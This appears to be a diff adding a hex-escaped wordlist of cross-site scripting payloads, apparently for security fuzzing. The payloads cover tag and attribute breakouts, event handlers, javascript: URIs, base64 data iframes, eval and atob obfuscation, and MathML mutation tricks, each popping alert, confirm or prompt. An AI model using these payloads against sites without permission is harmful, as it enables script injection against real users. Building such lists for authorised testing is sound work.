+\x22\x3e\x3c\x6d\x61\x72\x71\x75\x65\x65\x20\x6f\x6e\x73\x74\x61\x72\x74\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e
+\x22\x3e\x3c\x6d\x61\x72\x71\x75\x65\x65\x20\x6f\x6e\x73\x74\x61\x72\x74\x3d\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x3e
+\x22\x3e\x3c\x6d\x61\x72\x71\x75\x65\x65\x20\x6f\x6e\x73\x74\x61\x72\x74\x3d\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x3e
+\x22\x3e\x3c\x69\x66\x72\x61\x6d\x65\x20\x73\x72\x63\x64\x6f\x63\x3d\x22\x3c\x73\x63\x72\x69\x70\x74\x3e\x61\x6c\x65\x72\x74\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e\x22\x3e
+\x22\x3e\x3c\x69\x66\x72\x61\x6d\x65\x20\x73\x72\x63\x64\x6f\x63\x3d\x22\x3c\x73\x63\x72\x69\x70\x74\x3e\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e\x22\x3e
+\x22\x3e\x3c\x69\x66\x72\x61\x6d\x65\x20\x73\x72\x63\x64\x6f\x63\x3d\x22\x3c\x73\x63\x72\x69\x70\x74\x3e\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e\x22\x3e
+\x3c\x2f\x74\x69\x74\x6c\x65\x3e\x3c\x73\x63\x72\x69\x70\x74\x3e\x61\x6c\x65\x72\x74\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
+\x3c\x2f\x74\x69\x74\x6c\x65\x3e\x3c\x73\x63\x72\x69\x70\x74\x3e\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
+\x3c\x2f\x74\x69\x74\x6c\x65\x3e\x3c\x73\x63\x72\x69\x70\x74\x3e\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
+\x3c\x2f\x74\x65\x78\x74\x61\x72\x65\x61\x3e\x3c\x73\x63\x72\x69\x70\x74\x3e\x61\x6c\x65\x72\x74\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
+\x3c\x2f\x74\x65\x78\x74\x61\x72\x65\x61\x3e\x3c\x73\x63\x72\x69\x70\x74\x3e\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
+\x3c\x2f\x74\x65\x78\x74\x61\x72\x65\x61\x3e\x3c\x73\x63\x72\x69\x70\x74\x3e\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
+\x3c\x2f\x73\x74\x79\x6c\x65\x3e\x3c\x73\x63\x72\x69\x70\x74\x3e\x61\x6c\x65\x72\x74\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
+\x3c\x2f\x73\x74\x79\x6c\x65\x3e\x3c\x73\x63\x72\x69\x70\x74\x3e\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
+\x3c\x2f\x73\x74\x79\x6c\x65\x3e\x3c\x73\x63\x72\x69\x70\x74\x3e\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
+\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e\x3c\x73\x63\x72\x69\x70\x74\x3e\x61\x6c\x65\x72\x74\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
+\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e\x3c\x73\x63\x72\x69\x70\x74\x3e\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
+\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e\x3c\x73\x63\x72\x69\x70\x74\x3e\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
+\x3c\x2f\x74\x65\x78\x74\x61\x72\x65\x61\x3e\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e
+\x3c\x2f\x74\x65\x78\x74\x61\x72\x65\x61\x3e\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x3e
+\x3c\x2f\x74\x65\x78\x74\x61\x72\x65\x61\x3e\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x3e
+\x3c\x2f\x74\x65\x78\x74\x61\x72\x65\x61\x3e\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e
+\x3c\x2f\x74\x65\x78\x74\x61\x72\x65\x61\x3e\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x3e
+\x3c\x2f\x74\x65\x78\x74\x61\x72\x65\x61\x3e\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x3e
+\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x2f\x2f
+\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x3e
+\x3c\x69\x6d\x67\x2f\x73\x72\x63\x3d\x78\x2f\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x3e
+\x3c\x73\x76\x67\x2f\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e
+\x3c\x73\x76\x67\x2f\x6f\x6e\x6c\x6f\x61\x64\x3d\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x3e
+\x3c\x73\x76\x67\x2f\x6f\x6e\x6c\x6f\x61\x64\x3d\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x3e
+\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x22\x61\x6c\x65\x72\x74\x28\x31\x29\x22\x3e
+\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x27\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x27\x3e
+\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x2f\x2f
+\x3c\x73\x76\x67\x2f\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x60\x31\x60\x3e
+\x3c\x73\x76\x67\x2f\x6f\x6e\x6c\x6f\x61\x64\x3d\x63\x6f\x6e\x66\x69\x72\x6d\x60\x31\x60\x3e
+\x3c\x73\x76\x67\x2f\x6f\x6e\x6c\x6f\x61\x64\x3d\x70\x72\x6f\x6d\x70\x74\x60\x31\x60\x3e
+\x3c\x61\x20\x68\x72\x65\x66\x3d\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x61\x6c\x65\x72\x74\x28\x31\x29\x3e\x78\x3c\x2f\x61\x3e
+\x3c\x61\x20\x68\x72\x65\x66\x3d\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x3e\x78\x3c\x2f\x61\x3e
+\x3c\x61\x20\x68\x72\x65\x66\x3d\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x3e\x78\x3c\x2f\x61\x3e
+\x3c\x61\x20\x68\x72\x65\x66\x3d\x22\x20\x20\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x61\x6c\x65\x72\x74\x28\x31\x29\x22\x3e\x78\x3c\x2f\x61\x3e
+\x3c\x61\x20\x68\x72\x65\x66\x3d\x22\x20\x09\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x22\x3e\x78\x3c\x2f\x61\x3e
+\x3c\x61\x20\x68\x72\x65\x66\x3d\x22\x4a\x61\x56\x61\x53\x63\x52\x69\x50\x74\x3a\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x22\x3e\x78\x3c\x2f\x61\x3e
+\x3c\x61\x20\x68\x72\x65\x66\x3d\x22\x6a\x61\x76\x61\x26\x23\x31\x31\x35\x3b\x63\x72\x69\x70\x74\x3a\x61\x6c\x65\x72\x74\x28\x31\x29\x22\x3e\x78\x3c\x2f\x61\x3e
+\x3c\x61\x20\x68\x72\x65\x66\x3d\x22\x6a\x61\x76\x61\x26\x23\x78\x30\x39\x3b\x73\x63\x72\x69\x70\x74\x3a\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x22\x3e\x78\x3c\x2f\x61\x3e
+\x3c\x61\x20\x68\x72\x65\x66\x3d\x22\x5c\x78\x36\x61\x5c\x78\x36\x31\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x37\x33\x5c\x78\x36\x33\x5c\x78\x37\x32\x5c\x78\x36\x39\x5c\x78\x37\x30\x5c\x78\x37\x34\x3a\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x22\x3e\x78\x3c\x2f\x61\x3e
+\x3c\x66\x6f\x72\x6d\x3e\x3c\x62\x75\x74\x74\x6f\x6e\x20\x66\x6f\x72\x6d\x61\x63\x74\x69\x6f\x6e\x3d\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x61\x6c\x65\x72\x74\x28\x31\x29\x3e\x78\x3c\x2f\x62\x75\x74\x74\x6f\x6e\x3e\x3c\x2f\x66\x6f\x72\x6d\x3e
+\x3c\x66\x6f\x72\x6d\x3e\x3c\x62\x75\x74\x74\x6f\x6e\x20\x66\x6f\x72\x6d\x61\x63\x74\x69\x6f\x6e\x3d\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x3e\x78\x3c\x2f\x62\x75\x74\x74\x6f\x6e\x3e\x3c\x2f\x66\x6f\x72\x6d\x3e
+\x3c\x66\x6f\x72\x6d\x3e\x3c\x62\x75\x74\x74\x6f\x6e\x20\x66\x6f\x72\x6d\x61\x63\x74\x69\x6f\x6e\x3d\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x3e\x78\x3c\x2f\x62\x75\x74\x74\x6f\x6e\x3e\x3c\x2f\x66\x6f\x72\x6d\x3e
+\x3c\x69\x66\x72\x61\x6d\x65\x20\x73\x72\x63\x3d\x22\x64\x61\x74\x61\x3a\x74\x65\x78\x74\x2f\x68\x74\x6d\x6c\x2c\x3c\x73\x63\x72\x69\x70\x74\x3e\x61\x6c\x65\x72\x74\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e\x22\x3e\x3c\x2f\x69\x66\x72\x61\x6d\x65\x3e
+\x3c\x69\x66\x72\x61\x6d\x65\x20\x73\x72\x63\x3d\x22\x64\x61\x74\x61\x3a\x74\x65\x78\x74\x2f\x68\x74\x6d\x6c\x2c\x3c\x73\x63\x72\x69\x70\x74\x3e\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e\x22\x3e\x3c\x2f\x69\x66\x72\x61\x6d\x65\x3e
+\x3c\x69\x66\x72\x61\x6d\x65\x20\x73\x72\x63\x3d\x22\x64\x61\x74\x61\x3a\x74\x65\x78\x74\x2f\x68\x74\x6d\x6c\x2c\x3c\x73\x63\x72\x69\x70\x74\x3e\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e\x22\x3e\x3c\x2f\x69\x66\x72\x61\x6d\x65\x3e
+\x3c\x69\x66\x72\x61\x6d\x65\x20\x73\x72\x63\x3d\x22\x64\x61\x74\x61\x3a\x74\x65\x78\x74\x2f\x68\x74\x6d\x6c\x3b\x62\x61\x73\x65\x36\x34\x2c\x50\x48\x4e\x6a\x63\x6d\x6c\x77\x64\x44\x35\x68\x62\x47\x56\x79\x64\x43\x67\x78\x4b\x54\x77\x76\x63\x32\x4e\x79\x61\x58\x42\x30\x50\x67\x3d\x3d\x22\x3e\x3c\x2f\x69\x66\x72\x61\x6d\x65\x3e
+\x3c\x69\x66\x72\x61\x6d\x65\x20\x73\x72\x63\x3d\x22\x64\x61\x74\x61\x3a\x74\x65\x78\x74\x2f\x68\x74\x6d\x6c\x3b\x62\x61\x73\x65\x36\x34\x2c\x50\x48\x4e\x6a\x63\x6d\x6c\x77\x64\x44\x35\x6a\x62\x32\x35\x6d\x61\x58\x4a\x74\x4b\x44\x45\x70\x50\x43\x39\x7a\x59\x33\x4a\x70\x63\x48\x51\x2b\x22\x3e\x3c\x2f\x69\x66\x72\x61\x6d\x65\x3e
+\x3c\x69\x66\x72\x61\x6d\x65\x20\x73\x72\x63\x3d\x22\x64\x61\x74\x61\x3a\x74\x65\x78\x74\x2f\x68\x74\x6d\x6c\x3b\x62\x61\x73\x65\x36\x34\x2c\x50\x48\x4e\x6a\x63\x6d\x6c\x77\x64\x44\x35\x77\x63\x6d\x39\x74\x63\x48\x51\x6f\x4d\x53\x6b\x38\x4c\x33\x4e\x6a\x63\x6d\x6c\x77\x64\x44\x34\x3d\x22\x3e\x3c\x2f\x69\x66\x72\x61\x6d\x65\x3e
+\x3c\x78\x20\x6f\x6e\x6d\x6f\x75\x73\x65\x6f\x76\x65\x72\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e\x68\x6f\x76\x65\x72
+\x3c\x78\x20\x6f\x6e\x6d\x6f\x75\x73\x65\x65\x6e\x74\x65\x72\x3d\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x3e\x68\x6f\x76\x65\x72
+\x3c\x78\x20\x6f\x6e\x70\x6f\x69\x6e\x74\x65\x72\x6f\x76\x65\x72\x3d\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x3e\x68\x6f\x76\x65\x72
+\x3c\x78\x20\x6f\x6e\x63\x6c\x69\x63\x6b\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e\x63\x6c\x69\x63\x6b
+\x3c\x78\x20\x6f\x6e\x64\x62\x6c\x63\x6c\x69\x63\x6b\x3d\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x3e\x63\x6c\x69\x63\x6b
+\x3c\x78\x20\x6f\x6e\x70\x6f\x69\x6e\x74\x65\x72\x64\x6f\x77\x6e\x3d\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x3e\x63\x6c\x69\x63\x6b
+\x3c\x69\x6e\x70\x75\x74\x20\x6f\x6e\x66\x6f\x63\x75\x73\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x20\x61\x75\x74\x6f\x66\x6f\x63\x75\x73\x3e
+\x3c\x69\x6e\x70\x75\x74\x20\x6f\x6e\x66\x6f\x63\x75\x73\x3d\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x20\x61\x75\x74\x6f\x66\x6f\x63\x75\x73\x3e
+\x3c\x69\x6e\x70\x75\x74\x20\x6f\x6e\x66\x6f\x63\x75\x73\x3d\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x20\x61\x75\x74\x6f\x66\x6f\x63\x75\x73\x3e
+\x63\x61\x6c\x6c\x62\x61\x63\x6b\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x2f\x2f
+\x63\x61\x6c\x6c\x62\x61\x63\x6b\x3d\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x3b
+\x63\x61\x6c\x6c\x62\x61\x63\x6b\x3d\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x2f\x2f
+\x7d\x29\x28\x61\x6c\x65\x72\x74\x28\x31\x29\x29\x2f\x2f
+\x7d\x29\x28\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x29\x2f\x2f
+\x7d\x29\x28\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x29\x2f\x2f
+\x24\x7b\x61\x6c\x65\x72\x74\x28\x31\x29\x7d
+\x24\x7b\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x7d
+\x24\x7b\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x7d
+\x46\x75\x6e\x63\x74\x69\x6f\x6e\x60\x61\x6c\x65\x72\x74\x5c\x78\x32\x38\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x64\x6f\x6d\x61\x69\x6e\x5c\x78\x32\x39\x60\x28\x29
+\x46\x75\x6e\x63\x74\x69\x6f\x6e\x60\x63\x6f\x6e\x66\x69\x72\x6d\x5c\x78\x32\x38\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x64\x6f\x6d\x61\x69\x6e\x5c\x78\x32\x39\x60\x28\x29
+\x46\x75\x6e\x63\x74\x69\x6f\x6e\x60\x70\x72\x6f\x6d\x70\x74\x5c\x78\x32\x38\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x64\x6f\x6d\x61\x69\x6e\x5c\x78\x32\x39\x60\x28\x29
+\x5b\x5d\x2e\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72\x2e\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72\x28\x27\x61\x6c\x65\x72\x74\x28\x31\x29\x27\x29\x28\x29
+\x5b\x5d\x2e\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72\x2e\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72\x28\x27\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x27\x29\x28\x29
+\x5b\x5d\x2e\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72\x2e\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72\x28\x27\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x27\x29\x28\x29
+\x65\x76\x61\x6c\x28\x61\x74\x6f\x62\x28\x27\x59\x57\x78\x6c\x63\x6e\x51\x6f\x4d\x53\x6b\x3d\x27\x29\x29
+\x65\x76\x61\x6c\x28\x61\x74\x6f\x62\x28\x27\x59\x32\x39\x75\x5a\x6d\x6c\x79\x62\x53\x67\x78\x4b\x51\x3d\x3d\x27\x29\x29
+\x65\x76\x61\x6c\x28\x61\x74\x6f\x62\x28\x27\x63\x48\x4a\x76\x62\x58\x42\x30\x4b\x44\x45\x70\x27\x29\x29
+\x65\x76\x61\x6c\x28\x27\x5c\x78\x36\x31\x5c\x78\x36\x63\x5c\x78\x36\x35\x5c\x78\x37\x32\x5c\x78\x37\x34\x28\x5c\x78\x33\x31\x29\x27\x29
+\x65\x76\x61\x6c\x28\x27\x5c\x78\x36\x33\x5c\x78\x36\x66\x5c\x78\x36\x65\x5c\x78\x36\x36\x5c\x78\x36\x39\x5c\x78\x37\x32\x5c\x78\x36\x64\x28\x5c\x78\x33\x31\x29\x27\x29
+\x65\x76\x61\x6c\x28\x27\x5c\x78\x37\x30\x5c\x78\x37\x32\x5c\x78\x36\x66\x5c\x78\x36\x64\x5c\x78\x37\x30\x5c\x78\x37\x34\x28\x5c\x78\x33\x31\x29\x27\x29
+\x3c\x73\x76\x67\x3e\x3c\x73\x63\x72\x69\x70\x74\x3e\x61\x6c\x65\x72\x74\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e\x3c\x2f\x73\x76\x67\x3e
+\x3c\x73\x76\x67\x3e\x3c\x73\x63\x72\x69\x70\x74\x3e\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e\x3c\x2f\x73\x76\x67\x3e
+\x3c\x73\x76\x67\x3e\x3c\x73\x63\x72\x69\x70\x74\x3e\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e\x3c\x2f\x73\x76\x67\x3e
+\x3c\x73\x76\x67\x3e\x3c\x61\x6e\x69\x6d\x61\x74\x65\x20\x6f\x6e\x62\x65\x67\x69\x6e\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x20\x61\x74\x74\x72\x69\x62\x75\x74\x65\x4e\x61\x6d\x65\x3d\x78\x20\x64\x75\x72\x3d\x31\x73\x3e
+\x3c\x73\x76\x67\x3e\x3c\x61\x6e\x69\x6d\x61\x74\x65\x20\x6f\x6e\x62\x65\x67\x69\x6e\x3d\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x20\x61\x74\x74\x72\x69\x62\x75\x74\x65\x4e\x61\x6d\x65\x3d\x78\x20\x64\x75\x72\x3d\x31\x73\x3e
+\x3c\x73\x76\x67\x3e\x3c\x61\x6e\x69\x6d\x61\x74\x65\x20\x6f\x6e\x62\x65\x67\x69\x6e\x3d\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x20\x61\x74\x74\x72\x69\x62\x75\x74\x65\x4e\x61\x6d\x65\x3d\x78\x20\x64\x75\x72\x3d\x31\x73\x3e
+\x3c\x73\x76\x67\x3e\x3c\x73\x65\x74\x20\x6f\x6e\x62\x65\x67\x69\x6e\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x20\x61\x74\x74\x72\x69\x62\x75\x74\x65\x4e\x61\x6d\x65\x3d\x78\x20\x74\x6f\x3d\x31\x3e
+\x3c\x73\x76\x67\x3e\x3c\x73\x65\x74\x20\x6f\x6e\x62\x65\x67\x69\x6e\x3d\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x20\x61\x74\x74\x72\x69\x62\x75\x74\x65\x4e\x61\x6d\x65\x3d\x78\x20\x74\x6f\x3d\x31\x3e
+\x3c\x73\x76\x67\x3e\x3c\x73\x65\x74\x20\x6f\x6e\x62\x65\x67\x69\x6e\x3d\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x20\x61\x74\x74\x72\x69\x62\x75\x74\x65\x4e\x61\x6d\x65\x3d\x78\x20\x74\x6f\x3d\x31\x3e
+\x3c\x6d\x61\x74\x68\x3e\x3c\x6d\x74\x65\x78\x74\x3e\x3c\x74\x61\x62\x6c\x65\x3e\x3c\x6d\x67\x6c\x79\x70\x68\x3e\x3c\x73\x74\x79\x6c\x65\x3e\x3c\x21\x2d\x2d\x3c\x2f\x73\x74\x79\x6c\x65\x3e\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e
+\x3c\x6d\x61\x74\x68\x3e\x3c\x6d\x74\x65\x78\x74\x3e\x3c\x74\x61\x62\x6c\x65\x3e\x3c\x6d\x67\x6c\x79\x70\x68\x3e\x3c\x73\x74\x79\x6c\x65\x3e\x3c\x21\x2d\x2d\x3c\x2f\x73\x74\x79\x6c\x65\x3e\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x3e
+\x3c\x6d\x61\x74\x68\x3e\x3c\x6d\x74\x65\x78\x74\x3e\x3c\x74\x61\x62\x6c\x65\x3e\x3c\x6d\x67\x6c\x79\x70\x68\x3e\x3c\x73\x74\x79\x6c\x65\x3e\x3c\x21\x2d\x2d\x3c\x2f\x73\x74\x79\x6c\x65\x3e\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x3e
+\x3c\x21\x2d\x2d\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e\x2d\x2d\x3e
+\x3c\x21\x2d\x2d\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x3e\x2d\x2d\x3e
+\x3c\x21\x2d\x2d\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x3e\x2d\x2d\x3e
+\x2d\x2d\x3e\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e
+\x2d\x2d\x3e\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x3e
+\x2d\x2d\x3e\x3c\x69\x6d\x67\x20\x73\x72\x63\x3d\x78\x20\x6f\x6e\x65\x72\x72\x6f\x72\x3d\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x3e
+\x3c\x6d\x65\x74\x61\x20\x68\x74\x74\x70\x2d\x65\x71\x75\x69\x76\x3d\x72\x65\x66\x72\x65\x73\x68\x20\x63\x6f\x6e\x74\x65\x6e\x74\x3d\x22\x30\x3b\x75\x72\x6c\x3d\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x61\x6c\x65\x72\x74\x28\x31\x29\x22\x3e
+\x3c\x6d\x65\x74\x61\x20\x68\x74\x74\x70\x2d\x65\x71\x75\x69\x76\x3d\x72\x65\x66\x72\x65\x73\x68\x20\x63\x6f\x6e\x74\x65\x6e\x74\x3d\x22\x30\x3b\x75\x72\x6c\x3d\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x22\x3e
+\x3c\x6d\x65\x74\x61\x20\x68\x74\x74\x70\x2d\x65\x71\x75\x69\x76\x3d\x72\x65\x66\x72\x65\x73\x68\x20\x63\x6f\x6e\x74\x65\x6e\x74\x3d\x22\x30\x3b\x75\x72\x6c\x3d\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x22\x3e
+\x3c\x73\x74\x79\x6c\x65\x3e\x40\x69\x6d\x70\x6f\x72\x74\x27\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x61\x6c\x65\x72\x74\x28\x31\x29\x27\x3b\x3c\x2f\x73\x74\x79\x6c\x65\x3e
+\x3c\x73\x74\x79\x6c\x65\x3e\x40\x69\x6d\x70\x6f\x72\x74\x27\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x27\x3b\x3c\x2f\x73\x74\x79\x6c\x65\x3e
+\x3c\x73\x74\x79\x6c\x65\x3e\x40\x69\x6d\x70\x6f\x72\x74\x27\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x27\x3b\x3c\x2f\x73\x74\x79\x6c\x65\x3e
+\x3c\x64\x69\x76\x20\x73\x74\x79\x6c\x65\x3d\x22\x77\x69\x64\x74\x68\x3a\x65\x78\x70\x72\x65\x73\x73\x69\x6f\x6e\x28\x61\x6c\x65\x72\x74\x28\x31\x29\x29\x22\x3e\x78\x3c\x2f\x64\x69\x76\x3e
+\x3c\x64\x69\x76\x20\x73\x74\x79\x6c\x65\x3d\x22\x77\x69\x64\x74\x68\x3a\x65\x78\x70\x72\x65\x73\x73\x69\x6f\x6e\x28\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x29\x22\x3e\x78\x3c\x2f\x64\x69\x76\x3e
+\x3c\x64\x69\x76\x20\x73\x74\x79\x6c\x65\x3d\x22\x77\x69\x64\x74\x68\x3a\x65\x78\x70\x72\x65\x73\x73\x69\x6f\x6e\x28\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x29\x22\x3e\x78\x3c\x2f\x64\x69\x76\x3e
+\x22\x20\x6f\x6e\x6d\x6f\x75\x73\x65\x6f\x76\x65\x72\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x20\x78\x3d\x22
+\x22\x20\x6f\x6e\x6d\x6f\x75\x73\x65\x6f\x76\x65\x72\x3d\x63\x6f\x6e\x66\x69\x72\x6d\x28\x31\x29\x20\x78\x3d\x22
+\x22\x20\x6f\x6e\x6d\x6f\x75\x73\x65\x6f\x76\x65\x72\x3d\x70\x72\x6f\x6d\x70\x74\x28\x31\x29\x20\x78\x3d\x22
